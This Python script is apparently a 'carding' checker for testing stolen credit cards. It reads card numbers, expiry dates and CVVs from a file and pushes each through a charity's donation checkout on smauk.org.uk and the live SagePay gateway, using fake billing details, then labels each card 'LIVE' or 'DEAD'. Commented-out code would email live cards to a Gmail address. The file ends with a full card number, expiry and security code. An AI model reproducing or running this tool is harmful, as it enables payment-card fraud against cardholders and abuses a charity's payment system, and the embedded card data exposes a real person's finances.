from bs4 import BeautifulSoup
from colorama import Fore, init
import smtplib
import requests
import time


init()


class Checker():
    def __init__(self):
        self.first = "https://smauk.org.uk/baskets/add"
        self.second = "https://smauk.org.uk/checkout/details/"
        self.third = "https://smauk.org.uk/checkout/details"
        self.fourth = "https://live.sagepay.com/gateway/service/cardselection;" #  jsessionid=4E7E668020BC1138B954B13DD2BB4B13
        self.fifth = "https://live.sagepay.com/gateway/service/carddetails"
        self.sixth = "https://live.sagepay.com/gateway/service/authentication"
        self.range = []
        
        print("""
        {re}             {g}_____________{re}
        {re}------------{g}[ {r}CODECHECKER {g}]{re}------------
        {re}------------{g}|- {r}GATEWAY 2 -{g}|{re}------------
        {re}---------------------------------------
        """.format(g=Fore.GREEN, r=Fore.RED, re=Fore.RESET))
        
        print("\t            " + Fore.GREEN + "[CHOOSE CC TYPE]")
        print(Fore.YELLOW + "------------------------------------------------------------")
        print("{}[1] {}Visa\t{}[2] {}Visa Debit\t{}[3] {}MasterCard\t{}[4] {}MC Debit".format(Fore.RED, Fore.RESET,Fore.RED, Fore.RESET,Fore.RED, Fore.RESET,Fore.RED, Fore.RESET))
        print(Fore.YELLOW + "------------------------------------------------------------\n" + Fore.RESET)

        cctype = input(Fore.BLUE + "[?] CCType >>> " + Fore.RESET)
        if cctype == '1':
            self.cc = "VISA"
        elif cctype == '2':
            self.cc = "DELTA"
        elif cctype == "3":
            self.cc = 'MC'
        elif cctype == '4':
            self.cc = "MCDEBIT"
        else:
            print(Fore.RED + "[-] " + Fore.RESET + "Credit Card Type must be included")
            return

        with open('cc.txt', 'r') as ccs:
            for x in ccs.read().split('\n'):
                self.range.append(x)
        print(Fore.YELLOW + "[*] " + Fore.RESET + 'Checking ' + str(len(self.range)) + ' Credit Cards.')
        input(Fore.RESET + "PRESS ANY KEY TO CONTINUE")
        print(Fore.BLUE + "Start Checking at " + str(time.ctime()))
        print(Fore.RESET)
        self.checker()

    def check_on_sage(self, credit_card, ccentry):
        ccentry = str(ccentry)
        ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
        session = requests.Session()
        first_data = {
            "_method": "POST",
            "data[BasketItem][0][price]": "",
            "data[BasketItem][0][product_option_id]": '0',
            "data[BasketItem][0][quantity]": '1',
            "data[BasketItem][0][product_id]": '8',
            "save": "save"
        }

        first_response = session.post(self.first, data=first_data).text

        second_response = session.get(self.second).text

        third_data = {
            '_method': 'POST',
            'data[Order][billing_firstname]': "John",
            'data[Order][billing_lastname]': "Kermit",
            'data[Order][billing_contact_number]': "09496014457",
            'data[Order][email]': "bolbol6969696969@outlook.com",
            'data[Order][billing_address1]': "Street 918 commonwealth ave.",
            'data[Order][billing_address2]': "",
            'data[Order][billing_address3]': "",
            'data[Order][billing_city]': "Quezon City",
            'data[Order][billing_postcode]': "1121",
            'data[Order][billing_country]': "PH",
            'data[Order][terms]': "0",
            'data[Order][terms]': "1",
            'data[Order][dp_consent]': "0",
            'data[Order][dp_consent]': "1",
            'data[Order][dp_contact_email]': "0",
            'data[Order][dp_contact_mail]': "0",
            'data[Order][sameaddress]': "0",
            'data[Order][sameaddress]': "1",
            'data[Order][firstname]': "John",
            'data[Order][lastname]': "Kermit",
            'data[Order][contact_number]': "09496014457",
            'data[Order][address1]': "Street 918 commonwealth ave.",
            'data[Order][address2]': "",
            'data[Order][address3]': "",
            'data[Order][city]': "Quezon City",
            'data[Order][postcode]': "1121",
            'data[Order][country]': "PH",
            'data[Order][candle]': "0",
            'data[Order][donation]': "1",
            'data[Order][gift_aid]': "0",
            'data[Order][gift_aid_future]': "0",
            'data[Order][gift_aid_previous]': "0",
            "add": "add",
        }

        third_response = session.post(self.third, data=third_data).text

        session_ID = BeautifulSoup(third_response, 'html.parser').find('form', {'class': 'payment-method-list__form'})['action']

        fourth_data = {
            'action': 'proceed',
            'cardselected': self.cc,
        }

        fourth_response = session.post(session_ID, fourth_data).text

        fifth_data = {
            "cardholder": "John Kermit",
            "cardnumber": ccNum,
            "expirymonth": ccMonth,
            "expiryyear": ccYear.replace('20', ''),
            "securitycode": ccCode,
            "action": "proceed",
        }

        fifth_response = session.post(self.fifth, data=fifth_data).text

        last = session.post('https://live.sagepay.com/gateway/service/cardconfirmation', data={'action': 'proceed'})

        last_response = session.get(self.sixth).text

        result = BeautifulSoup(last_response, 'html.parser')

        try:
            res = result.find('div', {'class': 'notification'}).get_text().replace('\n', '').replace('\t', '')
            if 'insufficient authentication' in res:
                print("[" + ccentry + "] " + "LIVE " + credit_card + "\t ETO SURE YAWA")
                # server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                # server.login("ckknocktoyou@gmail.com", "mgabobo.com")
                # server.sendmail(
                #     "ckknocktoyou@gmail.com", 
                #     "ckknocktoyou@gmail.com", 
                #     "LIVE ---> " + credit_card + '\t Checked at ' + str(time.time()))
                # server.quit()
            else:
                print("[" + ccentry + "] " + " DEAD " + '\t----\t' + credit_card + " =>" + res)

        except Exception as e:
            # server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            # server.login("email", "password")
            # server.sendmail(
            #     "ckknocktoyou@gmail.com", 
            #     "ckknocktoyou@gmail.com", 
            #     "LIVE ---> " + credit_card + '\t Checked at ' + str(time.time()))
            # server.quit()
            print("[" + ccentry + "] " + "LIVE " + credit_card + '\tNOT SURE XD')

    def checker(self):
        f = open('cc.txt', 'r')
        cc = 0
        for x in f.read().split('\n'):
            cc += 1
            self.check_on_sage(x, cc)

        # server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        # server.login("email", "password")
        # server.sendmail(
        #     "ckknocktoyou@gmail.com", 
        #     "ckknocktoyou@gmail.com", 
        #     "Checked - " + str(time.time()))
        # server.quit()

"""
[693] 5210690278620433|06|2027|787      ----            The Authorisation has been rejected by the Vendor due to insufficient authentication. Please try a different card.    
"""
